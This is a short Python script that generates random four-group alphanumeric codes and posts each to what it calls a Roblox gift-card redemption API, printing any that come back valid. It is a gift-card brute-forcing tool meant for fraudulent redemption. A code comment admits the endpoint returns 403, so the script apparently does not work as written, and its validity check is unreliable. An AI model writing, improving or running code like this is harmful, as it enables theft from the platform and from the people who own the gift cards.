import random
import string
import requests

def generate_code():
    chars = string.ascii_letters + string.digits
    groups = [''.join(random.choices(chars, k=4)) for _ in range(4)]
    return '-'.join(groups)

def test_code(code):
    url = 'https://apis.roblox.com/payments-gateway/v1/gift-card/redeem'  # tried to find their api of redeemning but ends up 403 (access denied)
    payload = {'code': code}
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            result = response.json()
            if result.get('valid'):
                print(f"[✔] VALID CODE: {code}")
            else:
                print(f"[✘] Invalid code: {code}")
        else:
            print(f"test code manually...  {code}")
    except Exception as e:
        print(f"[!] Failed to connect: {e}")

# Test 100 codes
for _ in range(100):
    code = generate_code()
    test_code(code)
